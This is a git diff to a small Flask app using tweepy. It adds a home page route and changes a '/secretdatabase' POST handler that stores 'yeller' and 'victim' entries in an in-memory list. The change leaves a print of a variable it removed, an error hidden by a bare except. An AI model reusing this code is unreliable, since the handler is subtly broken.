@@ -1,9 +1,17 @@
 from flask import Flask
 from flask import request
+from flask import render_template, url_for
 
 import tweepy
 
 app = Flask(__name__)
+
+multiple_user_data = []
+
+@app.route('/')
+def home():
+	url_for('static', filename='style.css')
+	return render_template('index.html')
 
 @app.route('/secretdatabase', methods=['POST'])
 def storecredentials():
@@ -21,7 +29,8 @@ def storecredentials():
 				"victim username": request.form['victim']
 		}
 
-		accounts = [yeller, victim]
+		user_data = {"yeller": yeller, "victim": victim}
+		multiple_user_data.append(user_data)
 		print(accounts)
 		return 'Success'
   	except:
